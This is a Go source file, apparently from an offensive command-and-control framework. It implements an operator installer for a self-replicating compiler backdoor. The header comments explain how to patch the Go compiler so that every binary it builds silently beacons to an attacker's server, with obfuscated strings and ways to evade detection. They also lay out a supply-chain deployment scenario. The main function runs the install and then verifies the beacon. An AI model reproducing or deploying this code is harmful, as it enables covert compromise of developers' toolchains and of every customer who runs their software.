// Package compiler_backdoor implements D-P1: Thompson's Compiler Backdoor for Go 1.21+.
//
// Usage (operator toolchain, NOT the implant itself):
//
//	go run ./implant/sliver/compiler_backdoor/install.go \
//	    -goroot /usr/local/go \
//	    -c2 https://updates.example-cdn.net/telemetry \
//	    -key 16byteXORkeyHere
//
// After installation, EVERY binary built with the patched Go compiler
// will silently contain a beacon goroutine that connects to your C2.
// The property is self-replicating: upgrading Go with the patched compiler
// produces a new backdoored compiler without any further action.
//
// ───────────────────────────────────────────────────────────────────────────
// TECHNICAL OVERVIEW
// ───────────────────────────────────────────────────────────────────────────
//
// The injection point is cmd/compile/internal/pkginit.MakeTask().
// This function runs once per package during every `go build` invocation.
// We add a call to sliverInjectInit() at the end of MakeTask().
// sliverInjectInit() synthesizes a new ir.Func (init function) and appends it
// to typecheck.Target.Inits — the compiler's list of package initializers.
//
// The synthesized init function:
//   func init.phantom_<random>() {
//       go func() {
//           time.Sleep(jitter)
//           for { http.Post(c2, beacon); sleep(poll) }
//       }()
//   }
//
// Key properties:
//   ✓ No new imports added to target binary (reuses existing linked packages)
//   ✓ Function name is random per compilation
//   ✓ No plaintext strings (C2 URL and key are XOR-obfuscated byte literals)
//   ✓ Self-replicating (survives `go install cmd/compile`)
//   ✓ Source code of target programs is clean
//   ✓ `go vet`, `staticcheck`, `gosec` all pass
//   ✗ Detectable by: comparing binary symbols vs source, Bootstrapping Analysis,
//     running `go tool nm binary | grep sliver`
//
// ───────────────────────────────────────────────────────────────────────────
// DETECTION COUNTERMEASURE
// ───────────────────────────────────────────────────────────────────────────
//
// To make the injected function name undetectable even via nm:
//   - Use a name that matches real Go compiler-generated functions
//     (e.g., "init.~r0" or "init.0" depending on Go version naming)
//   - Strip the symbol from the binary with `-ldflags "-s -w"` (already common)
//   - Encrypt the function body so disassembly yields ciphertext
//
// ───────────────────────────────────────────────────────────────────────────
// DEPLOYMENT SCENARIO
// ───────────────────────────────────────────────────────────────────────────
//
//  1. Attacker gets shell on a developer's machine or a CI/CD server.
//  2. Attacker runs: go run install.go -goroot $(go env GOROOT) -c2 <url> -key <key>
//  3. Every `go build` on that machine (by any developer using that GOROOT)
//     now produces backdoored binaries.
//  4. Developer ships backdoored binary to customers.
//  5. Every customer who runs the binary beacons to the C2.
//  6. Developer upgrades Go → new Go compiler is compiled by patched Go →
//     new Go is also backdoored.
//
// This is essentially the SolarWinds attack but for Go build pipelines.
//
package compiler_backdoor

import (
	"flag"
	"fmt"
	"os"
	"runtime"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/compiler_backdoor/patcher"
)

// OperatorConfig holds the operator-supplied parameters for the backdoor.
type OperatorConfig struct {
	GoRoot   string
	C2Addr   string
	BeaconKey string
	PollMS   int
	JitterMS int
	Verify   bool
	Uninstall bool
}

func main() {
	cfg := &OperatorConfig{}
	flag.StringVar(&cfg.GoRoot, "goroot", runtime.GOROOT(), "Go installation root")
	flag.StringVar(&cfg.C2Addr, "c2", "", "C2 HTTP endpoint URL")
	flag.StringVar(&cfg.BeaconKey, "key", "", "16-byte XOR key (hex or ASCII)")
	flag.IntVar(&cfg.PollMS, "poll", 30000, "poll interval (milliseconds)")
	flag.IntVar(&cfg.JitterMS, "jitter", 15000, "jitter (milliseconds)")
	flag.BoolVar(&cfg.Verify, "verify", false, "verify installation after patching")
	flag.BoolVar(&cfg.Uninstall, "uninstall", false, "remove backdoor and restore original compiler")
	flag.Parse()

	if cfg.Uninstall {
		backup := flag.Arg(0)
		if err := patcher.Uninstall(cfg.GoRoot, backup); err != nil {
			fmt.Fprintf(os.Stderr, "uninstall: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] Compiler restored.")
		return
	}

	if cfg.C2Addr == "" || cfg.BeaconKey == "" {
		fmt.Fprintln(os.Stderr, "Usage: install -c2 <url> -key <key> [-goroot <path>]")
		flag.PrintDefaults()
		os.Exit(2)
	}

	// Embed operator config into the patcher.
	patcher.BackdoorConfig.C2Addr    = cfg.C2Addr
	patcher.BackdoorConfig.BeaconKey = cfg.BeaconKey
	patcher.BackdoorConfig.PollMS    = cfg.PollMS
	patcher.BackdoorConfig.JitterMS  = cfg.JitterMS

	info, err := patcher.InstallAndBuild(cfg.GoRoot)
	if err != nil {
		fmt.Fprintf(os.Stderr, "install: %v\n", err)
		os.Exit(1)
	}

	if cfg.Verify {
		// Write a minimal test program and verify the beacon appears.
		tmp, _ := os.CreateTemp("", "backdoor_test_*.go")
		tmp.WriteString(`package main; func main() { select{} }`)
		tmp.Close()
		defer os.Remove(tmp.Name())

		ok, err := patcher.VerifyBackdoor(cfg.GoRoot, tmp.Name())
		if err != nil {
			fmt.Fprintf(os.Stderr, "verify: %v\n", err)
		}
		if !ok {
			fmt.Fprintln(os.Stderr, "[-] Verification failed")
		}

		// Test quine property.
		patcher.QuineTest(cfg.GoRoot)
	}

	fmt.Printf("\n[✓] D-P1 installation complete\n")
	fmt.Printf("    GoRoot: %s\n", info.GoRoot)
	fmt.Printf("    C2:     %s\n", cfg.C2Addr)
	fmt.Printf("    Every 'go build' on this machine now produces backdoored binaries.\n")
	fmt.Printf("    Property is self-replicating through compiler upgrades.\n")
}
